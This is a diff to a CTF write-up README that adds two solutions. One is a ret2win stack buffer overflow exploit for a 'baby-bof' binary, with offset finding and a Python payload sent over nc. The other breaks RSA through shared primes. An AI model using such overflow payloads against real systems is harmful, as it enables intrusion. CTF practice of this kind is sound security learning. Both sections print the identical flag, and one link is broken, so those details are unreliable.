@@ -9,7 +9,7 @@
 
 - [SSS](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#SSS)
 
-- Neverending Randomness
+- [Neverending Randomness])(https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#neverending-randomness)
 
 - [XORBITANT](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#xorbitant)
 
@@ -67,7 +67,7 @@
 
 - [Sigdance](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#sigdance)
 
-- Baby-BOF
+- [Baby-BOF](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#baby-bof)
 
 - [Fini](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#fini)
 
@@ -82,6 +82,175 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### baby-bof
+
+- Started with
+
+```
+$ nc ctf.ac.upt.ro 9553
+Bine ai venit la PWN!
+Spune ceva:
+hey
+La revedere!
+```
+
+- Okay, it echoes something and then exits. Classic. I grabbed the provided binary to work locally and did the usual two quick checks:
+
+- $ file challenge
+
+```
+challenge: ELF 64-bit LSB executable, x86-64, ...
+```
+
+- $ checksec --file=challenge
+
+```
+# NX enabled, Canary off, PIE disabled
+```
+
+- PIE disabled means function addresses will be fixed—perfect for a ret2win. Time to hunt for the “win” function:
+
+```
+$ objdump -d ./challenge | grep -n "<win>" -n -A2
+401196 <win>:
+...
+```
+
+- Nice: there really is a win() at 0x401196. Next question: how many bytes until RIP? I first tried the lazy way—just overflow with a lot of A’s and see if it crashes:
+
+```
+$ (python3 -c 'print("A"*200)'; sleep 0.1) | ./challenge
+# crash confirmed
+```
+
+- That told me I could smash the stack, but not the offset. I almost reached for pattern_create/pattern_offset, then remembered these intros usually have a 64‑byte buffer with an 8‑byte saved RBP… so I guessed 64 + 8 = 72. To be sure, I did a quick GDB sanity check with a cyclic pattern (one tiny detour where I forgot to run it under gdb and wondered why I wasn’t getting a register readout—whoops). The 72‑byte guess held up.
+
+- With the offset and a fixed win() address, the plan was simple: pad → RIP → win. I tried a local run first:
+
+```
+$ python3 - <<'PY'
+import sys, struct
+payload = b"A"*72 + struct.pack("<Q", 0x401196)
+sys.stdout.buffer.write(payload)
+PY
+# fed that to ./challenge and saw the function get hit
+```
+
+- Confident enough, I pointed it at the remote service. My first attempt used print() without binary mode and added an accidental newline—which didn’t work. Switching to sys.stdout.buffer fixed it:
+
+```
+$ python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q",0x401196))' | nc ctf.ac.upt.ro 9553
+Bine ai venit la PWN!
+Spune ceva:
+```
+- ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
+
+### neverending-randomness
+
+- Service: nc ctf.ac.upt.ro 9510
+- Given: one ciphertext, three moduli (n1, n2, n3), e = 65537.
+
+- I connected first:
+
+```
+nc ctf.ac.upt.ro 9510
+```
+
+- It printed a giant “Encrypted Flag” number and three big n’s. The title said “Repeated RSA,” which to me reads: “someone encrypted the same thing multiple times.”
+
+- Finding the shared primes
+- I checked gcds:
+
+```
+    python3 - <<'PY'
+    from math import gcd
+    e = 65537
+    c = int("3092274656...2275778")
+    n1 = int("1696297701...76941")
+    n2 = int("1375534436...19903")
+    n3 = int("1563683580...757107")
+    p = gcd(n1, n2)
+    q = gcd(n1, n3)
+    r = gcd(n2, n3)
+    print("p =", p)
+    print("q =", q)
+    print("r =", r)
+    PY
+```
+
+- Boom—three non‑trivial gcds. So n1 = p*q, n2 = p*r, n3 = q*r.
+
+- Keys from there
+- I built the private exponents:
+
+```
+    python3 - <<'PY'
+    def egcd(a,b):
+        if b==0: return (1,0,a)
+        x,y,g = egcd(b,a%b); return (y, x-(a//b)*y, g)
+    def inv(a,m):
+        x,y,g=egcd(a,m); assert g==1; return x%m
+    e=65537
+    # use p,q,r,n1,n2,n3 from the previous step
+    phi1=(p-1)*(q-1); d1=inv(e,phi1)
+    phi2=(p-1)*(r-1); d2=inv(e,phi2)
+    phi3=(q-1)*(r-1); d3=inv(e,phi3)
+    print(d1, d2, d3)
+    PY
+```
+
+- A dead end (the “chain pow()” trap)
+- I tried the lazy route:
+
+```
+    python3 - <<'PY'
+    # wrong idea: just do three pow() in a row
+    m = pow(pow(pow(c, d3, n3), d2, n2), d1, n1)
+    print(m.to_bytes((m.bit_length()+7)//8, 'big'))
+    PY
+```
+
+- Garbage output. Right—after removing one layer you only know the previous value **mod that n**, and the moduli overlap. I needed to try possible “lifts” and the order.
+
+- Final small script
+- I wrote a tiny brute that tries all 6 orders and lifts residues with simple k*n additions:
+
+```
+    python3 - <<'PY'
+    from math import gcd
+    from itertools import permutations
+    def egcd(a,b):
+        if b==0: return (1,0,a)
+        x,y,g=egcd(b,a%b); return (y, x-(a//b)*y, g)
+    def inv(a,m):
+        x,y,g=egcd(a,m); return x%m
+    def lift(res, mod, bound):
+        a=res%mod
+        if bound-1<a: return []
+        kmax=(bound-1-a)//mod
+        return [a+k*mod for k in range(kmax+1)]
+    def tobytes(n): return n.to_bytes((n.bit_length()+7)//8 or 1,'big')
+    e=65537
+    c=int("3092274656...2275778")
+    n1=int("1696297701...76941"); n2=int("1375534436...19903"); n3=int("1563683580...757107")
+    p=gcd(n1,n2); q=gcd(n1,n3); r=gcd(n2,n3)
+    d1=inv(e,(p-1)*(q-1)); d2=inv(e,(p-1)*(r-1)); d3=inv(e,(q-1)*(r-1))
+    keys=[("n1",n1,d1),("n2",n2,d2),("n3",n3,d3)]
+    for order in permutations(keys,3):
+        (A,NA,dA),(B,NB,dB),(C,NC,dC)=order
+        yB_mod=pow(c,dC,NC)
+        for yB in lift(yB_mod, NC, NB):
+            yA_mod=pow(yB,dB,NB)
+            for yA in lift(yA_mod, NB, NA):
+                m=pow(yA,dA,NA)
+                s=tobytes(m)
+                if b"ctf{" in s:
+                    print(order, s.decode()); raise SystemExit
+    PY
+```
+
+- ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
 
 ### xorbitant
 
